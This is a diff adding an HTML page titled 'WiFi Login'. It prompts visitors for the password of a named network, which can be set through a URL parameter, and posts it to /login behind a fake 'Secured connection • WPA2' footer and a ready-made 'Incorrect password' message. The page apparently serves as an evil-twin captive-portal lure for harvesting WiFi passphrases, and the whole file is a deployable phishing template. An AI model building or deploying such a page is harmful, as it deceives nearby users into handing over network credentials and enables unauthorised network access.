@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WiFi Login</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+  .card {
+    background: white;
+    border-radius: 12px;
+    padding: 36px 32px;
+    width: 100%;
+    max-width: 380px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+  }
+  .wifi-icon {
+    text-align: center;
+    font-size: 48px;
+    margin-bottom: 8px;
+  }
+  h2 {
+    text-align: center;
+    font-size: 20px;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+  }
+  .subtitle {
+    text-align: center;
+    font-size: 13px;
+    color: #888;
+    margin-bottom: 28px;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: #444;
+    margin-bottom: 6px;
+  }
+  input {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1.5px solid #ddd;
+    border-radius: 8px;
+    font-size: 15px;
+    outline: none;
+    transition: border 0.2s;
+    margin-bottom: 18px;
+  }
+  input:focus { border-color: #0070f3; }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #0070f3;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  button:hover { background: #005ecb; }
+  .footer {
+    text-align: center;
+    font-size: 11px;
+    color: #bbb;
+    margin-top: 20px;
+  }
+  .error {
+    background: #fff0f0;
+    border: 1px solid #ffcccc;
+    color: #cc0000;
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-size: 13px;
+    margin-bottom: 16px;
+    display: none;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="wifi-icon">&#x1F4F6;</div>
+  <h2>Connect to WiFi</h2>
+  <p class="subtitle">Enter your WiFi password to continue</p>
+
+  <div class="error" id="error">Incorrect password. Please try again.</div>
+
+  <form id="loginForm" action="/login" method="POST">
+    <label for="ssid">Network</label>
+    <input type="text" id="ssid" name="ssid" value="HomeNetwork" readonly>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" placeholder="WiFi password" autocomplete="off">
+
+    <button type="submit">Connect</button>
+  </form>
+
+  <div class="footer">Secured connection &bull; WPA2</div>
+</div>
+
+<script>
+  // Set SSID from URL param if provided: index.html?ssid=MyNetwork
+  const params = new URLSearchParams(window.location.search);
+  if (params.get("ssid")) {
+    document.getElementById("ssid").value = params.get("ssid");
+  }
+</script>
+</body>
+</html>
